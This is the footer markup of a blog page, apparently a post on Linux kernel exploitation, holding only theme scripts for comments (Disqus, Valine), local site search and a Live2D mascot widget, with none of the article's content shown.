        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  













  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  

  
    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
  

  
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'http://ama2in9.top/2020/09/03/kernel/';
        this.page.identifier = '2020/09/03/kernel/';
        this.page.title = 'Kernel Pwn从入门到放弃';
        };
      function loadComments () {
        var d = document, s = d.createElement('script');
        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      }
      
        loadComments();
      
    </script>
  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: true,
        notify: true,
        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
        placeholder: 'Just go go',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: true
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  
  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
</html>
